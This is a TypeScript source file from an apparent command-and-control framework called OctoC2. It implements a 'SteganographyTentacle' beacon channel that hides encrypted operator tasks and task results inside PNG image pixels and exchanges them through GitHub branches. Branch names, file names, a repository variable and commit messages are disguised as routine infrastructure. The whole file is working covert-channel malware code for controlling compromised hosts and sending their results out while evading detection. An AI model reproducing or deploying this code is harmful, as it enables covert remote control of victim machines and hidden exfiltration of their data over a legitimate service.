/**
 * OctoC2 — SteganographyTentacle (Tentacle 9 — LSB image stego channel)
 *
 * Hides encrypted C2 payloads in PNG images using LSB alpha-channel
 * steganography (via StegoCodec). Transports PNG files via git branch API,
 * mirroring the BranchTentacle pattern.
 *
 * Branch layout:
 *   refs/heads/infra-cache-{id8}  — dedicated branch per beacon
 *
 * Files on the branch:
 *   infra-{id8}-a.png   — ACK: beacon registration payload hidden in PNG pixels
 *   infra-{id8}-t.png   — Task: encrypted Task[] blob hidden in PNG pixels
 *   infra-{id8}-r.png   — Result: sealed TaskResult blob hidden in PNG pixels
 *
 * PNG files are stored as binary blobs via git API (encoding: "base64").
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  StegoCodec,
  decodeStegoPng,
  encodeStegoPng,
} from "@octoc2/shared/stego";
import {
  decryptBox, sealBox,
  base64ToBytes,
} from "../crypto/sodium.ts";
import type {
  CheckinPayload,
  Task,
  TaskResult,
  ResultSubmissionOutcome,
} from "../types.ts";

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
const REF_UPDATE_ATTEMPTS = 3;

function isRefConflict(error: unknown): boolean {
  const status = (error as { status?: number } | null)?.status;
  return status === 409 || status === 422;
}

export class SteganographyTentacle extends BaseTentacle {
  readonly kind = "stego" as const;

  private lastTaskSha: string | null = null;
  private operatorPublicKey: Uint8Array | null = null;
  private defaultBranch: string | null = null;

  // ── Identity helpers ─────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  /** Full ref name for the infra-cache branch (used with createRef) */
  private get branchRef(): string { return `refs/heads/infra-cache-${this.id8}`; }

  /** Short ref for getRef/updateRef/deleteRef (strips "refs/") */
  private get branchRefShort(): string { return `heads/infra-cache-${this.id8}`; }

  private get ackFile(): string { return `infra-${this.id8}-a.png`; }
  private get taskFile(): string { return `infra-${this.id8}-t.png`; }
  private resultFile(taskId: string): string {
    return `infra-${this.id8}-r-${taskId.slice(0, 8)}.png`;
  }

  // ── Availability ─────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.getDefaultBranchHeadSha();
      return true;
    } catch {
      return false;
    }
  }

  private async getDefaultBranchHeadSha(): Promise<string> {
    const { owner, name: repo } = this.config.repo;
    if (!this.defaultBranch) {
      const repository = await this.octokit.rest.repos.get({ owner, repo });
      const branch = repository.data.default_branch?.trim();
      if (!branch) {
        throw new Error(
          "SteganographyTentacle: repository has no default branch",
        );
      }
      this.defaultBranch = branch;
    }
    const ref = await this.octokit.rest.git.getRef({
      owner,
      repo,
      ref: `heads/${this.defaultBranch}`,
    });
    return ref.data.object.sha;
  }

  // ── Operator key resolution ──────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.operatorPublicKey) return this.operatorPublicKey;
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (!b64) throw new Error("SteganographyTentacle: MONITORING_PUBKEY variable not set");
    const key = await base64ToBytes(b64);
    if (key.length !== 32) throw new Error("SteganographyTentacle: operator public key is not 32 bytes");
    this.operatorPublicKey = key;
    return key;
  }

  // ── Branch SHA helper ────────────────────────────────────────────────────────

  private async getBranchSha(): Promise<string | null> {
    try {
      const resp = await this.octokit.rest.git.getRef({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
        ref:   this.branchRefShort,
      });
      return resp.data.object.sha;
    } catch (err: any) {
      if (err?.status === 404) return null;
      throw err;
    }
  }

  // ── Write binary file via git blob+tree+commit+updateRef ────────────────────

  private async writeFileBinary(path: string, data: Uint8Array, message: string): Promise<void> {
    const { owner, name: repo } = this.config.repo;

    // Convert binary data to base64 string for the API
    let b64 = "";
    // Use chunk-based approach for large buffers to avoid call stack overflow
    const chunkSize = 0x8000;
    for (let i = 0; i < data.length; i += chunkSize) {
      b64 += String.fromCharCode(...data.subarray(i, i + chunkSize));
    }
    const content = btoa(b64);

    // The blob is immutable and can be reused across optimistic ref retries.
    const blobResp = await this.octokit.rest.git.createBlob({
      owner, repo,
      content,
      encoding: "base64",
    });
    const blobSha = blobResp.data.sha;

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      const headSha = await this.getBranchSha();
      const baseCommitSha = headSha ?? await this.getDefaultBranchHeadSha();
      const baseCommit = await this.octokit.rest.git.getCommit({
        owner,
        repo,
        commit_sha: baseCommitSha,
      });

      const treeResp = await this.octokit.rest.git.createTree({
        owner, repo,
        base_tree: baseCommit.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha:  blobSha,
        }],
      });
      const commitResp = await this.octokit.rest.git.createCommit({
        owner, repo,
        message,
        tree: treeResp.data.sha,
        parents: [baseCommitSha],
      });

      try {
        if (headSha) {
          await this.octokit.rest.git.updateRef({
            owner, repo,
            ref:   this.branchRefShort,
            sha:   commitResp.data.sha,
            force: false,
          });
        } else {
          await this.octokit.rest.git.createRef({
            owner, repo,
            ref: this.branchRef,
            sha: commitResp.data.sha,
          });
        }
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  // ── Read binary file from branch ─────────────────────────────────────────────

  private async readFileBinary(path: string): Promise<Uint8Array | null> {
    const { owner, name: repo } = this.config.repo;
    try {
      const resp = await this.octokit.rest.repos.getContent({
        owner, repo,
        path,
        ref: this.branchRef,
      });
      const data = resp.data as any;
      if (data.type !== "file" || !data.content) return null;
      // GitHub API returns base64-encoded content
      const binary = atob(data.content.replace(/\n/g, ""));
      const bytes = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }
      return bytes;
    } catch (err: any) {
      if (err?.status === 404) return null;
      throw err;
    }
  }

  // ── Delete file from branch ──────────────────────────────────────────────────

  private async deleteFile(path: string): Promise<void> {
    const { owner, name: repo } = this.config.repo;

    for (let attempt = 1; attempt <= REF_UPDATE_ATTEMPTS; attempt++) {
      const headSha = await this.getBranchSha();
      if (!headSha) return;

      const commitResp = await this.octokit.rest.git.getCommit({
        owner, repo, commit_sha: headSha,
      });
      const treeResp = await this.octokit.rest.git.createTree({
        owner, repo,
        base_tree: commitResp.data.tree.sha,
        tree: [{
          path,
          mode: "100644",
          type: "blob",
          sha:  null,
        }] as any,
      });
      const newCommit = await this.octokit.rest.git.createCommit({
        owner, repo,
        message: "sync",
        tree:    treeResp.data.sha,
        parents: [headSha],
      });

      try {
        await this.octokit.rest.git.updateRef({
          owner, repo,
          ref:   this.branchRefShort,
          sha:   newCommit.data.sha,
          force: false,
        });
        return;
      } catch (error) {
        if (
          attempt === REF_UPDATE_ATTEMPTS ||
          !isRefConflict(error)
        ) {
          throw error;
        }
      }
    }
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    if (!payload.identity) {
      throw new Error(
        "SteganographyTentacle: signed checkin identity is required",
      );
    }

    // 1. Refresh the ACK PNG before every task poll.
    const ackBytes = new TextEncoder().encode(JSON.stringify(payload));
    const pngBytes = encodeStegoPng(ackBytes);
    await this.writeFileBinary(this.ackFile, pngBytes, "update");

    const operatorPubKey = await this.getOperatorPublicKey();

    // 2. Change detection via branch SHA (check before downloading PNG)
    const currentSha = await this.getBranchSha();
    if (currentSha && currentSha === this.lastTaskSha) return [];
    this.lastTaskSha = currentSha;

    // 3. Poll for task PNG
    let taskPngBytes: Uint8Array | null;
    try {
      taskPngBytes = await this.readFileBinary(this.taskFile);
    } catch {
      return [];
    }

    if (!taskPngBytes) return [];

    // 4. Decode PNG → pixels → StegoCodec.decode() → encrypted envelope
    let tasks: Task[];
    try {
      const jsonBytes = decodeStegoPng(taskPngBytes);
      if (!jsonBytes) return [];

      const envelope = JSON.parse(new TextDecoder().decode(jsonBytes)) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 5. Delete task PNG after consumption
    try {
      await this.deleteFile(this.taskFile);
      this.lastTaskSha = null;
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ─────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
    const operatorPubKey = await this.getOperatorPublicKey();

    // sealBox returns base64url string — encode to bytes for stego embedding
    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
    const sealedBytes = new TextEncoder().encode(sealed);

    const pngBytes = encodeStegoPng(sealedBytes);

    await this.writeFileBinary(this.resultFile(result.taskId), pngBytes, "update");
    return {
      artifactWritten: true,
      controllerAccepted: false,
      channel: "stego",
      acceptance: null,
    };
  }

  // ── Teardown ──────────────────────────────────────────────────────────────────

  override async teardown(): Promise<void> {
    // Normal lifecycle teardown must not delete the per-beacon branch: it may
    // still contain result artifacts that the server has not polled yet.
    this.lastTaskSha = null;
    this.operatorPublicKey = null;
    this.defaultBranch = null;
  }

  // ── Codec delegates (keep for backward compat / testing) ─────────────────────

  static encode(pixels: Uint8Array, payload: Uint8Array): Uint8Array {
    return StegoCodec.encode(pixels, payload);
  }

  static decode(pixels: Uint8Array, max?: number): Uint8Array | null {
    return StegoCodec.decode(pixels, max);
  }

  // ── Crypto helpers ────────────────────────────────────────────────────────────

  async encodePayload(plaintext: string, operatorPublicKey: Uint8Array): Promise<Uint8Array> {
    const sealedB64 = await sealBox(plaintext, operatorPublicKey);
    return new TextEncoder().encode(sealedB64);
  }

  /**
   * Returns the raw embedded string decoded from the LSB-stego pixel data.
   * Note: this is the raw (not decrypted) payload — the embedded bytes are
   * returned as-is from StegoCodec.decode(). `_operatorSecretKey` is reserved
   * for future decryption support and is not used.
   */
  async decodePayload(pixels: Uint8Array, _operatorSecretKey?: Uint8Array): Promise<string | null> {
    const hidden = StegoCodec.decode(pixels);
    if (!hidden) return null;
    return new TextDecoder().decode(hidden);
  }
}
